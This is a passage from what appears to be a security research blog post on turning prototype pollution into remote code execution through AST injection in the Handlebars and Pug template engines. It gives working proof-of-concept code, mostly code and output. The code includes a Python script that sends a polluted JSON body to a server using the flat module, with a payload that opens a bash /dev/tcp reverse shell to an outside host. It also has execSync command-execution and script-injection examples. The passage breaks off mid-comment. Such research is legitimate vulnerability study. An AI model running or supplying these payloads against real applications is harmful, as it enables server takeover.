class="property">pendingContent</span>) &#123;</span><br><span class="line">content = <span class="variable language_">this</span>.<span class="property">pendingContent</span> + content;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">pendingLocation</span> = <span class="variable language_">this</span>.<span class="property">source</span>.<span class="property">currentLocation</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">pendingContent</span> = content;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">pushSource</span>: <span class="keyword">function</span> <span class="title function_">pushSource</span>(<span class="params">source</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">pendingContent</span>) &#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">source</span>.<span class="title function_">push</span>(<span class="variable language_">this</span>.<span class="title function_">appendToBuffer</span>(<span class="variable language_">this</span>.<span class="property">source</span>.<span class="title function_">quotedString</span>(<span class="variable language_">this</span>.<span class="property">pendingContent</span>), <span class="variable language_">this</span>.<span class="property">pendingLocation</span>));</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">pendingContent</span> = <span class="literal">undefined</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (source) &#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">source</span>.<span class="title function_">push</span>(source);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>This is done by the <code>appendContent</code> function of <code>javascript-compiler.js</code><br><code>appendContent</code> is this.If <code>pendingContent</code> is present, append to the content and returns.</p><p><code>pushSource</code> makes the <code>pendingContent</code> to <code>undefined</code>, preventing the string from being inserted multiple times.</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p><img src="/img/2020/08/graph_5.jpg" alt="img"></p><p>Handlebars work as shown in the graph above.</p><p>After lexer and parser generater AST, It passes to <code>compiler.js</code><br>We can run the template function compiler generated with some arguments.<br>and It returns the string like “Hello posix” (when msg is posix)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="regexp">/node_modules/</span>handlebars/dist/cjs/handlebars/compiler/parser.<span class="property">js</span> --&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">36</span>:</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$</span> = &#123; <span class="attr">type</span>: <span class="string">&#x27;NumberLiteral&#x27;</span>, <span class="attr">value</span>: <span class="title class_">Number</span>($$[$<span class="number">0</span>]), <span class="attr">original</span>: <span class="title class_">Number</span>($$[$<span class="number">0</span>]), <span class="attr">loc</span>: yy.<span class="title function_">locInfo</span>(<span class="variable language_">this</span>.<span class="property">_$</span>) &#125;;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>The parser in handlebars forces the value of a node whose type is NumberLiteral to always be a number through the Number constructor.<br>However, you can insert a non-numeric string here using the prototype pollution.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="regexp">/node_modules/</span>handlebars/dist/cjs/handlebars/compiler/base.<span class="property">js</span> --&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">parseWithoutProcessing</span>(<span class="params">input, options</span>) &#123;</span><br><span class="line">  <span class="comment">// Just return if an already-compiled AST was passed in.</span></span><br><span class="line">  <span class="keyword">if</span> (input.<span class="property">type</span> === <span class="string">&#x27;Program&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  _parser2[<span class="string">&#x27;default&#x27;</span>].<span class="property">yy</span> = yy;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Altering the shared object here, but this is ok as parser is a sync operation</span></span><br><span class="line">  yy.<span class="property">locInfo</span> = <span class="keyword">function</span> (<span class="params">locInfo</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> yy.<span class="title class_">SourceLocation</span>(options &amp;&amp; options.<span class="property">srcName</span>, locInfo);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> ast = _parser2[<span class="string">&#x27;default&#x27;</span>].<span class="title function_">parse</span>(input);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ast;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">parse</span>(<span class="params">input, options</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> ast = <span class="title function_">parseWithoutProcessing</span>(input, options);</span><br><span class="line">  <span class="keyword">var</span> strip = <span class="keyword">new</span> _whitespaceControl2[<span class="string">&#x27;default&#x27;</span>](options);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> strip.<span class="title function_">accept</span>(ast);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>First, look at the compile function, and it supports two ways of input, AST Object and template string.</p><p>when input.type is a <code>Program</code>, although the input value is actually string.<br>Parser considers it’s already AST parsed by parser.js and send it to the compiler without any processing.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="regexp">/node_modules/</span>handlebars/dist/cjs/handlebars/compiler/compiler.<span class="property">js</span> --&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="attr">accept</span>: <span class="keyword">function</span> <span class="title function_">accept</span>(<span class="params">node</span>) &#123;</span><br><span class="line">    <span class="comment">/* istanbul ignore next: Sanity code */</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>[node.<span class="property">type</span>]) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> _exception2[<span class="string">&#x27;default&#x27;</span>](<span class="string">&#x27;Unknown type: &#x27;</span> + node.<span class="property">type</span>, node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sourceNode</span>.<span class="title function_">unshift</span>(node);</span><br><span class="line">    <span class="keyword">var</span> ret = <span class="variable language_">this</span>[node.<span class="property">type</span>](node);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sourceNode</span>.<span class="title function_">shift</span>();</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title class_">Program</span>: <span class="keyword">function</span> <span class="title function_">Program</span>(<span class="params">program</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>((<span class="keyword">new</span> <span class="title class_">Error</span>).<span class="property">stack</span>)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">blockParams</span>.<span class="title function_">unshift</span>(program.<span class="property">blockParams</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> body = program.<span class="property">body</span>,</span><br><span class="line">        bodyLength = body.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bodyLength; i++) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">accept</span>(body[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">blockParams</span>.<span class="title function_">shift</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isSimple</span> = bodyLength === <span class="number">1</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">blockParams</span> = program.<span class="property">blockParams</span> ? program.<span class="property">blockParams</span>.<span class="property">length</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>The compiler given the AST Object (actually a string) send it to the <code>accept</code> method.<br>and <code>accept</code> calls <code>this[node.type]</code> of Compiler.<br>Then take body attribute of AST and use it for constructing function.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Handlebars</span> = <span class="built_in">require</span>(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">type</span> = <span class="string">&#x27;Program&#x27;</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">body</span> = [&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;MustacheStatement&quot;</span>,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;params&quot;</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;NumberLiteral&quot;</span>,</span><br><span class="line">        <span class="string">&quot;value&quot;</span>: <span class="string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())&quot;</span></span><br><span class="line">    &#125;],</span><br><span class="line">    <span class="string">&quot;loc&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;start&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;end&quot;</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`Hello &#123;&#123; msg &#125;&#125;`</span>;</span><br><span class="line"><span class="keyword">const</span> template = <span class="title class_">Handlebars</span>.<span class="title function_">precompile</span>(source);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">eval</span>(<span class="string">&#x27;(&#x27;</span> + template + <span class="string">&#x27;)&#x27;</span>)[<span class="string">&#x27;main&#x27;</span>].<span class="title function_">toString</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">function (container, depth0, helpers, partials, data) &#123;</span></span><br><span class="line"><span class="comment">    var stack1, lookupProperty = container.lookupProperty || function (parent, propertyName) &#123;</span></span><br><span class="line"><span class="comment">        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) &#123;</span></span><br><span class="line"><span class="comment">            return parent[propertyName];</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        return undefined</span></span><br><span class="line"><span class="comment">    &#125;;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    return ((stack1 = (lookupProperty(helpers, &quot;undefined&quot;) || (depth0 &amp;&amp; lookupProperty(depth0, &quot;undefined&quot;)) || container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || &#123;&#125;), console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString()), &#123;</span></span><br><span class="line"><span class="comment">        &quot;name&quot;: &quot;undefined&quot;,</span></span><br><span class="line"><span class="comment">        &quot;hash&quot;: &#123;&#125;,</span></span><br><span class="line"><span class="comment">        &quot;data&quot;: data,</span></span><br><span class="line"><span class="comment">        &quot;loc&quot;: &#123;</span></span><br><span class="line"><span class="comment">            &quot;start&quot;: 0,</span></span><br><span class="line"><span class="comment">            &quot;end&quot;: 0</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;)) != null ? stack1 : &quot;&quot;);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>As a result, an attack can be configured like this.<br>If you have gone through parser, specify a string that cannot be assigned to the value of NumberLiteral.<br>But Injected AST processed, we can insert any code into the function.</p><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; unflatten &#125; = <span class="built_in">require</span>(<span class="string">&#x27;flat&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Handlebars</span>  = <span class="built_in">require</span>(<span class="string">&#x27;handlebars&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> source = <span class="string">&quot;&lt;h1&gt;It works!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> template = <span class="title class_">Handlebars</span>.<span class="title function_">compile</span>(source);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="title function_">template</span>(&#123;&#125;));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/vulnerable&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> object = <span class="title function_">unflatten</span>(req.<span class="property">body</span>);</span><br><span class="line">    res.<span class="title function_">json</span>(object);</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p>Example of configuring a vulnerable server using a flat module it has prototype pollution vulnerability.</p><p><img src="/img/2020/08/graph_6.png" alt="img"></p><p>The flat is a popular module with 4.61 million downloads per week<br>the patch for the prototype pollution vulnerablity reported has not yet been made.</p><blockquote><p> <a href="https://github.com/hughsk/flat/issues/105">https://github.com/hughsk/flat/issues/105</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">TARGET_URL = <span class="string">&#x27;http://p6.is:3000&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make pollution</span></span><br><span class="line">requests.post(TARGET_URL + <span class="string">&#x27;/vulnerable&#x27;</span>, json = &#123;</span><br><span class="line">    <span class="string">&quot;__proto__.type&quot;</span>: <span class="string">&quot;Program&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__proto__.body&quot;</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;MustacheStatement&quot;</span>,</span><br><span class="line">        <span class="string">&quot;path&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;params&quot;</span>: [&#123;</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;NumberLiteral&quot;</span>,</span><br><span class="line">            <span class="string">&quot;value&quot;</span>: <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(`bash -c &#x27;bash -i &gt;&amp; /dev/tcp/p6.is/3333 0&gt;&amp;1&#x27;`)&quot;</span></span><br><span class="line">        &#125;],</span><br><span class="line">        <span class="string">&quot;loc&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;start&quot;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;end&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute</span></span><br><span class="line">requests.get(TARGET_URL)</span><br></pre></td></tr></table></figure><p><img src="/img/2020/08/pic_1.png" alt="img"></p><p>We can Insert the any command into the value to obtain the shell.</p><h2 id="Pug"><a href="#Pug" class="headerlink" title="Pug"></a>Pug</h2><p><img src="/img/2020/08/graph_7.png" alt="img"></p><p>Until today, this <code>pug</code> has been downloaded a total of <code>65,827,719</code> times.</p><p><code>pug</code> is a module that was previously developed under the name jade and renamed.<br>According to statistics, it is the 4th most popular template engine in nodejs.</p><h3 id="How-to-Detect-1"><a href="#How-to-Detect-1" class="headerlink" title="How to Detect"></a>How to Detect</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pug = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`h1= msg`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn = pug.<span class="title function_">compile</span>(source);</span><br><span class="line"><span class="keyword">var</span> html = <span class="title function_">fn</span>(&#123;<span class="attr">msg</span>: <span class="string">&#x27;It works&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(html); <span class="comment">// &lt;h1&gt;It works&lt;/h1&gt;</span></span><br></pre></td></tr></table></figure><p>A common way to use a template in a pug is as above.<br>The pug.compile function converts a string into a template function and passes the object for reference.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pug = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">block</span> = &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Text&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">`&lt;script&gt;alert(origin)&lt;/script&gt;`</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`h1= msg`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn = pug.<span class="title function_">compile</span>(source, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> html = <span class="title function_">fn</span>(&#123;<span class="attr">msg</span>: <span class="string">&#x27;It works&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(html); <span class="comment">// &lt;h1&gt;It works&lt;script&gt;alert(origin)&lt;/script&gt;&lt;/h1&gt;</span></span><br></pre></td></tr></table></figure><p>It is a method to check the use of pug template engine in a black-box environment using prototype pollution.<br>When you insert AST into the <code>Object.prototype.block</code>, the compiler adds it to the buffer by referring to the val.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (ast.<span class="property">type</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;NamedBlock&#x27;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;Block&#x27;</span>:</span><br><span class="line">        ast.<span class="property">nodes</span> = <span class="title function_">walkAndMergeNodes</span>(ast.<span class="property">nodes</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;Case&#x27;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;Filter&#x27;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;Mixin&#x27;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;Tag&#x27;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;InterpolatedTag&#x27;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;When&#x27;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;Code&#x27;</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;While&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> (ast.<span class="property">block</span>) &#123;</span><br><span class="line">        ast.<span class="property">block</span> = <span class="title function_">walkAST</span>(ast.<span class="property">block</span>, before, after, options);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>When ast.type is <code>While</code>, it calls walkASK with <code>ast.block</code> (refers prototype if the value does not exist)<br>If the template refer any value from argument, the While node is always exists, so the reliblity is considered quite high.</p><p>In fact, if developer don’t have to refer to any values from argument in the template<br>they wouldn’t use any template engines in the first place.</p><h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p><img src="/img/2020/08/graph_8.jpg" alt="img"></p><p><code>Pug</code> work as shown in the graph above.<br>Unlike <code>handlebars</code>, each process is separated into a separate module.<br>AST generated by <code>pug-parser</code> is passed to the <code>pug-code-gen</code> and made into a function.<br>and finally, it will be executed.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- <span class="regexp">/node_modules/</span>pug-code-gen/index.<span class="property">js</span> --&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (debug &amp;&amp; node.<span class="property">debug</span> !== <span class="literal">false</span> &amp;&amp; node.<span class="property">type</span> !== <span class="string">&#x27;Block&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (node.<span class="property">line</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> js = <span class="string">&#x27;;pug_debug_line = &#x27;</span> + node.<span class="property">line</span>;</span><br><span class="line">        <span class="keyword">if</span> (node.<span class="property">filename</span>)</span><br><span class="line">            js += <span class="string">&#x27;;pug_debug_filename = &#x27;</span> + <span class="title function_">stringify</span>(node.<span class="property">filename</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">push</span>(js + <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the compiler of the pug, there is a variable that stores the line number named <code>pug_debug_line</code> for debugging.<br>If the node.line value exists, it is added to the buffer, otherwise it is passed.</p><p>For AST generated with pug-parser, the <code>node.line</code> value is always specified as an integer.<br>But, we can insert a string into the <code>node.line</code> through AST Injection and cause arbitrary code execution.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pug = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">block</span> = &#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;Text&quot;</span>, <span class="string">&quot;line&quot;</span>: <span class="string">&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> source = <span class="string">`h1= msg`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn = pug.<span class="title function_">compile</span>(source, &#123;&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(fn.<span class="title function_">toString</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">function template(locals) &#123;</span></span><br><span class="line"><span class="comment">    var pug_html = &quot;&quot;,</span></span><br><span class="line"><span class="comment">        pug_mixins = &#123;&#125;,</span></span><br><span class="line"><span class="comment">        pug_interp;</span></span><br><span class="line"><span class="comment">    var pug_debug_filename, pug_debug_line;</span></span><br><span class="line"><span class="comment">    try &#123;;</span></span><br><span class="line"><span class="comment">        var locals_for_with = (locals || &#123;&#125;);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        (function (console, msg, process) &#123;;</span></span><br><span class="line"><span class="comment">            pug_debug_line = 1;</span></span><br><span class="line"><span class="comment">            pug_html = pug_html + &quot;\u003Ch1\u003E&quot;;;</span></span><br><span class="line"><span class="comment">            pug_debug_line = 1;</span></span><br><span class="line"><span class="comment">            pug_html = pug_html + (pug.escape(null == (pug_interp = msg) ? &quot;&quot; : pug_interp));;</span></span><br><span class="line"><span class="comment">            pug_debug_line = console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString());</span></span><br><span class="line"><span class="comment">            pug_html = pug_html + &quot;ndefine\u003C\u002Fh1\u003E&quot;;</span></span><br><span class="line"><span class="comment">        &#125;.call(this, &quot;console&quot; in locals_for_with ?</span></span><br><span class="line"><span class="comment">            locals_for_with.console :</span></span><br><span class="line"><span class="comment">            typeof console !== &#x27;undefined&#x27; ? console : undefined, &quot;msg&quot; in locals_for_with ?</span></span><br><span class="line"><span class="comment">            locals_for_with.msg 